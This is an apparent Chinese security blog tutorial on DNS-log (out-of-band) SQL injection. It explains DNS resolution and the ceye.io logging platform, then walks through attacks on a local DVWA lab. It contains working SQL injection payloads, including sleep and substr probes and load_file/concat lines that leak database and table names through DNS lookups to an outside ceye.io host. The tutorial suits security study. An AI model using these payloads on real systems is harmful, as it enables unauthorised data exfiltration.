---
title: DNS Log Injection
date: 2020-06-18 22:40:04
tags:
 - DNS-Injection
---
注入类漏洞我们都了解,比如之前整理SQL Injection时介绍和说明的一样,而今天学习的DNS Log 注入通过名称我们应该也知道,是利用DNS来完成的带外注入的攻击手段,而这些又如何实现的呢?一起慢慢来学习分析.

## DNS定义

### DNS介绍

DNS(Domain Name System，域名系统),它使用层次结构的命名系统,因特网上作为域名和IP地址相互映射的一个分布式数据库系统,能够使用户更方便的访问互联网,而不用去记住能够被机器直接读取的IP数串.通过主机名,最终得到该主机名对应的IP地址的过程叫做域名解析(或主机名解析).DNS协议运行在UDP协议之上.服务器端工作在UDP协议端口53和TCP协议端口53上.

下图是一个DNS解析模拟过程,其中IPV4对应的是客户端,主机存在对应IP地址,经过DNS解析后会找到对应我们想要访问的WEB应用服务器,从而获取我们想要的资源,后续将会继续介绍DNS的请求流程.

![](/images/DNS_Log/dns.png)

### DNS请求流程

DNS是应用层协议,事实上它是为其它应用层协议工作的,包括不限于HTTP和SMTP以及FTP,用于将用户提供的主机名解析为IP地址.

具体过程如下:

1. 主机向本地域名服务器实行递归查询,如果本地无法查询域名对应的IP地址时,此时本地域名服务器就以DNS客户的身份,向其他根域名服务器继续发出查询请求报文(替主机继续查询),而不是让主机自己进行下一步查询.
2. 本地域名服务器向根域名服务器实现迭代查询,根域名服务器收到本地域名服务器发来的查询请求后,如果根域名服务器可以直接查询得到对应IP地址直接回复即可,如果此根域名服务器查询不到,那么它会告知本地域名服务器让它下一步请求哪一个根域名服务器.本地域名服务器获得下一步“指示”后去请求另一根域名服务器,直到获取请求中的域名对应IP地址,本地域名服务器获得IP后会告知开始请求的主机它请求域名对应IP地址,整个DNS查询基本完成.
3. 主机获得本地域名服务器回复的IP地址,就可以向该IP地址进行HTTP服务器发起TCP连接.

### DNS体系结构

从用户主机上调用应用程序的角度看,DNS是一个提供简单、直接的转换服务的黑盒子.但事实上.实现这个服务的黑盒子非常复杂,它由分布于全球的大量DNS服务器以及定义了DNS服务器与查询主机通信方式的应用层协议组成.

DNS的一种简单的设计模式就是在因特网上只使用一个DNS服务器,该服务器包含所有的映射,在这种集中式的设计中,客户机直接将所有查询请求发往单一的DNS服务器,同时该DNS服务器直接对所有查询客户机做出响应,尽管这种设计方式非常诱人.

但他不适用当前的互联网,因为当今的因特网有着数量巨大并且在持续增长的主机,这种集中式设计会有单点故障,通信容量(上亿台主机发送的查询DNS报文请求,包括但不限于所有的HTTP请求,电子邮件报文服务器,TCP长连接服务),远距离的时间延迟,维护开销大(因为所有的主机名-ip映射都要在一个服务站点更新)等问题.

DNS服务器一般分三种,根DNS服务器,顶级DNS服务器,权威DNS服务器.使用分布式的层次数据库模式以及缓存方法来解决单点集中式的问题.

DNS 域名称:

| DNS域名 |       组织类型       |
| :-----: | :------------------: |
|   gov   | 非军事政府机构(政府) |
|   mil   |     军事政府机构     |
|   edu   |       教育机构       |
|   com   |       商业公司       |
|   net   |       网络公司       |
|   ...   |         ...          |

客户机上用nslookup命令查询一下 `www.test3.com`,马上可以看到本地DNS服务器(192.168.88.10)直接查全球13台根域中的某几台,然后一步步解析,通过迭代的方式,直到找到 `www.test3.com`对应的IP为68.178.213.61.本地DNS服务器得到test3域的IP后,它把这个IP返回给192.168.88.126客户机,完成解析.

![](/images/DNS_Log/Wireshark.png)

<center>Wireshark检测截图</center>

### DNS的重要性

这13台根服务器可以指挥浏览器(比如.internet explorer)和电子邮件程序(比如.Firefox)以控制互联网通信.由于根服务器中有经美国政府批准的260个左右的互联网后缀(如．com、．net等)和一些国家的指定符.

曾经一位互联网资深专家解释说,美国控制了域名解析的根服务器,也就控制了相应的所有域名,如果美国不想让人访问某些域名,就可以屏蔽掉这些域名,使它们的IP地址无法解析出来,那么这些域名所指向的网站就相当于从互联网的世界中消失了.比如:2004年4月,由于“.ly”域名瘫痪,导致利比亚从互联网上消失了3天.

### DNS攻击中应用

以上已经了解了DNS整个流程,但是DNS如何利用到攻击中呢?而上面也已经介绍了DNS整个过程并不存在可利用的攻击,除非运营商进行DNS劫持去发发广告之类的事情.

但我们知道在SQL注入中有一种姿势是延迟注入(时间延迟)来判断注入以及其他敏感数据信息.但,我们知道延迟注入非常费时不容易被发现,所以现在有种方式可以解决此类无法直接显示报错/查询结果的一种攻击方式,DNS Log注入可以满足这一姿势.

## ceye.io介绍

在进行介绍DNS Log注入之前我们又不得不介绍下一个带外工具,那就是大家熟知的一个平台:ceye.

### ceye.io作用

CEYE是一个用来检测带外(Out-of-Band)流量的监控平台,如DNS查询和HTTP请求.它可以帮助安全研究人员在测试漏洞时收集信息(例如SSRF/XXE/RFI/RCE等),具体的介绍可以参考ceye的官网介绍.

### 产生背景

漏洞检测或漏洞利用需要进一步完成用户或系统交互,一些漏洞类型没有直接表明(回显)攻击是否成功;如Payload触发了却不在前端页面显示.为了解决这个问题,于是就开发了CEYE平台.通过使用诸如DNS和HTTP之类的带外信道,便可以得到回显信息.

### 如何使用

登录ceye.io,在用户详情页可以看到自己的域名标识符 identifier,对于每个用户,都有唯一的域名标识符如:abcdef.ceye.io,所有来自于abcdef.ceye.io或*.abcdef.ceye.io的DNS查询和HTTP请求都会被记录.通过查看这些记录信息,安全研究人员可以确认并改进自己的漏洞研究方案(其他使用参考官网使用手册).

注册后会分配identifier

![](/images/DNS_Log/ceye.png)

#### DNS带外信道检测 Blind Payload 流程

![](/images/DNS_Log/dns_out.png)

<center>DNS Log带外注入一般流程</center>

#### 本地测试

通过上面我们已经注册了ceye并生成了一个三级域名.

1、首先到profile中添加需要解析的DNS服务器地址,可以添加多个

![](/images/DNS_Log/ceye1.png)

2、在终端中输入

nslookup test.u7tu9q.ceye.io

![](/images/DNS_Log/ns.png)

3、回到终端中可以获取DNS查询数据

![](/images/DNS_Log/ceye2.png)

#### HTTP带外信道检测

可以通过终端或浏览器方式进行HTTP请求目标主机,并携带DNS的三级域名获取返回数据包信息.

![](/images/DNS_Log/curl.png)

![](/images/DNS_Log/ceye3.png)

## DNS Log Injection实战

### 准备

1. MAMP集成环境
2. DVWA源码
3. CEYE.io平台
4. 火狐/Chrome及Hackbar插件
5. Burp Suite1.7.30

### Start

0x1:环境搭建部分省略

环境搭建部分可以直接参考网上即可,这里不做介绍.

0x2:URL访问

键入id=1时会输出id存在数据库中.

```php+HTML
id=1&Submit=%C3%A6%C2%8F%C2%90%C3%A4%C2%BA%C2%A4#
```

![](/images/DNS_Log/dvwa.png)

0x3:单引号测试

```php+HTML
id=1%27&Submit=%C3%83%C2%A6%C3%82%C2%8F%C3%82%C2%90% C3%83%C2%A4%C3%82%C2%BA%C3%82%C2%A4#
```

![](/images/DNS_Log/dvwa1.png)

0x4:无报错信息

可能无法判断是否存在注入(实际中不会有类似黑色部分提醒),后续判断是否存在注入，通过sleep判断服务器是否存在访问延迟,如果存在,说明存在盲注(这里可以参考之前发的SQL Inject Cheat sheet).

```php+HTML
id=1%27%20and%20sleep(10)--+&Submit=%C3%83%C2%A6%C3%82%C2%8F%C3%82%C2%90 %C3%83%C2%A4%C3%82%C2%BA%C3%82%C2%A4#
```

![](/images/DNS_Log/dvwa2.png)

0x5:其他手工检测

在介绍SQL的时候我们知道可以通过ascii、substr等函数进行一个一个字符进行判断,但,我们知道那样效率太低.

如:判断数据库中第一张表的第一个字符的ascii码:

```sql
id=1' and ascii(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 0,1),1,1))=103--+&Submit=Ã¦ÂÂÃ¤ÂºÂ¤#
```

![](/images/DNS_Log/dvwa3.png)

0x6:DNS Log检测

登录平台,清理DNS Query查询

![](/images/DNS_Log/ceye4.png)

0x7:构造payload

```sql
id=1' and if((select load_file(concat('\\\\',(select database()),'.u7tu9q.ceye.io\\abc'))),1,1)--+ URL:id=1' and if((select load_file(concat('\\\\',(select database()),'.u7tu9q.ceye.io\\abc'))),1,1)--+ &Submit=Ã¦ÂÂÃ¤ÂºÂ¤#
```

![](/images/DNS_Log/dvwa4.png)

0x8:查询结果

如下图得知:

![](/images/DNS_Log/ceye5.png)

0x9:其他payload

获取信息可以通过修改常规注入时payload一致.

```sql
id=1' and if((select load_file(concat('\\\\',(select table_name from information_schema.tables where table_schema="dvwa" limit 0,1),'.u7tu9q.ceye.io\\abc'))),1,1)--+ &Submit=Ã¦ÂÂÃ¤ÂºÂ¤#
```

![](/images/DNS_Log/dvwa5.png)

![](/images/DNS_Log/ceye6.png)

0x10:其他

其他payload不一一测试,可自行测试.

### 英文参考

英文版的相关介绍可参考以下pdf文件,自行下载查阅.

[DNS_Log_Injection](http://www.si1ent.xyz/ziliao/DNSLogSQLInjection.pdf)

## 参考

```php+HTML
https://www.seceye.cn/710.html
http://byd.dropsec.xyz/2016/12/04/dnslog%E5%88%A9%E7%94%A8/
https://bbs.ichunqiu.com/thread-22002-1-1.html
https://ricterz.me/posts/%E7%AC%94%E8%AE%B0:%20D ata%20Retrieval%20over%20DNS%20in%20SQL%20Injection%20Attacks
```

